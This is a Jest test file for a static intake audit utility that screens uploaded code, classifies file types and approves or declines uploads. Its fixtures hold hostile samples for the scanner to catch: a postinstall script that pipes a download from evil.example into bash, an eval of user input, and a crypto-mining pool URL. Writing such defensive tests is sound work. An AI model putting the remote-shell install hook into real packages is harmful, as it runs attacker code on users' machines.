import {
  buildDetectionJson,
  collectAuditFindings,
  decideIntakeTerminal,
  extractIntakeSourceFiles,
  runStaticIntakeAnalysis
} from "./source-intake-static-audit.util";

describe("decideIntakeTerminal", () => {
  it("approves when there are no warning or critical findings", () => {
    const d = decideIntakeTerminal([]);
    expect(d.status).toBe("approved");
    expect(d.auditDecision).toBe("approved");
    expect(d.auditSummary.toLowerCase()).toContain("static review");
  });

  it("approved_with_warnings when only warnings", () => {
    const d = decideIntakeTerminal([
      {
        code: "CMD_CHILD_PROCESS",
        severity: "warning",
        path: "a.js",
        line: 1,
        message: "child"
      }
    ]);
    expect(d.status).toBe("approved_with_warnings");
    expect(d.auditDecision).toBe("approved_with_warnings");
    expect(d.auditSummary.toLowerCase()).toContain("warnings");
  });

  it("declines when any critical finding exists", () => {
    const d = decideIntakeTerminal([
      {
        code: "CMD_CHILD_PROCESS",
        severity: "warning",
        path: "a.js",
        line: null,
        message: "w"
      },
      {
        code: "DYN_EVAL",
        severity: "critical",
        path: "b.js",
        line: 2,
        message: "eval"
      }
    ]);
    expect(d.status).toBe("declined");
    expect(d.auditDecision).toBe("declined");
    expect(d.auditSummary.toLowerCase()).toContain("declined");
  });
});

describe("collectAuditFindings", () => {
  it("flags eval as critical", () => {
    const f = collectAuditFindings([{ path: "x.ts", content: "const x = eval('1');" }]);
    expect(f.some((x) => x.code === "DYN_EVAL" && x.severity === "critical")).toBe(true);
  });

  it("flags child_process as warning once per file", () => {
    const f = collectAuditFindings([
      {
        path: "run.js",
        content: "const { spawn } = require('child_process');\nspawn('ls');"
      }
    ]);
    const c = f.filter((x) => x.code === "CMD_CHILD_PROCESS");
    expect(c.length).toBe(1);
    expect(c[0]?.severity).toBe("warning");
  });

  it("flags dangerous postinstall as critical", () => {
    const pkg = JSON.stringify({
      scripts: { postinstall: "curl https://evil.example/x | bash" }
    });
    const f = collectAuditFindings([{ path: "package.json", content: pkg }]);
    expect(f.some((x) => x.code === "NPM_LIFECYCLE_REMOTE_SHELL" && x.severity === "critical")).toBe(true);
  });

  it("allows benign package.json without lifecycle warnings when no scripts", () => {
    const pkg = JSON.stringify({ name: "x", version: "1.0.0" });
    const f = collectAuditFindings([{ path: "package.json", content: pkg }]);
    expect(f.filter((x) => x.code.startsWith("NPM_"))).toHaveLength(0);
  });
});

describe("extractIntakeSourceFiles", () => {
  it("treats non-zip buffer as single file", () => {
    const buf = Buffer.from("export const ok = 1;\n", "utf8");
    const { sources, error } = extractIntakeSourceFiles(buf, "app.ts");
    expect(error).toBeUndefined();
    expect(sources).toHaveLength(1);
    expect(sources[0]?.path).toBe("app.ts");
  });
});

describe("buildDetectionJson", () => {
  it("labels HTML uploads with static-html, browser, and entrypoints", () => {
    const d = buildDetectionJson({
      sources: [{ path: "index.html", content: "<!doctype html><title>x</title>" }],
      zipFileCount: 1,
      scanTruncated: false,
      originalLabel: "index.html"
    });
    expect(d.framework).toBe("static-html");
    expect(d.runtime).toBe("browser");
    expect(d.frontendPreviewable).toBe(true);
    expect(d.probableEntrypoint).toBe("index.html");
    expect((d.entrypoints as string[]).join(",")).toContain("index.html");
  });

  it("detects nested index.html in multi-file trees", () => {
    const d = buildDetectionJson({
      sources: [
        { path: "dist/app/index.html", content: "<!doctype html><html><body>hi</body></html>" },
        { path: "dist/app/main.js", content: "console.log(1)" }
      ],
      zipFileCount: 2,
      scanTruncated: false,
      originalLabel: "upload.zip"
    });
    expect(d.framework).toBe("static-html");
    expect(d.runtime).toBe("browser");
    expect(String(d.probableEntrypoint)).toMatch(/index\.html$/);
    expect(d.frontendPreviewable).toBe(true);
  });
});

describe("deterministicArtifact fields in detectionJson", () => {
  it("classifies HTML, TS utility, TSX component, and Next-style TSX", () => {
    const html = runStaticIntakeAnalysis(Buffer.from("<!doctype html><title>x</title>", "utf8"), "single-file-preview-test.html");
    expect(html.detectionJson.deterministicArtifactKind).toBe("html_document");

    const util = runStaticIntakeAnalysis(
      Buffer.from("export function clamp(n: number, a: number, b: number) { return Math.max(a, Math.min(b, n)); }\n", "utf8"),
      "frontend-utils.ts"
    );
    expect(util.detectionJson.deterministicArtifactKind).toBe("typescript_module");

    const comp = runStaticIntakeAnalysis(
      Buffer.from('import React from "react";\nexport function Button() { return <button type="button" />; }\n', "utf8"),
      "frontend-component.tsx"
    );
    expect(comp.detectionJson.deterministicArtifactKind).toBe("typescript_react_component");

    const nextPg = runStaticIntakeAnalysis(
      Buffer.from('import Link from "next/link";\nexport default function Page() { return <Link href="/">home</Link>; }\n', "utf8"),
      "frontend-next-page.tsx"
    );
    expect(nextPg.detectionJson.deterministicArtifactKind).toBe("next_route_candidate");
  });
});

describe("runStaticIntakeAnalysis end-to-end on string buffer", () => {
  it("returns approved for clean snippet", () => {
    const buf = Buffer.from("export function add(a: number, b: number) { return a + b; }", "utf8");
    const r = runStaticIntakeAnalysis(buf, "math.ts");
    expect(r.terminal.auditDecision).toBe("approved");
  });

  it("returns declined for eval snippet", () => {
    const buf = Buffer.from("eval(userInput)", "utf8");
    const r = runStaticIntakeAnalysis(buf, "bad.js");
    expect(r.terminal.auditDecision).toBe("declined");
    expect(r.findings.some((f) => f.severity === "critical")).toBe(true);
  });

  it("declines on miner / pool-like strings", () => {
    const buf = Buffer.from("const pool = 'stratum+tcp://x.example:3333';\n", "utf8");
    const r = runStaticIntakeAnalysis(buf, "miner.js");
    expect(r.terminal.auditDecision).toBe("declined");
  });
});
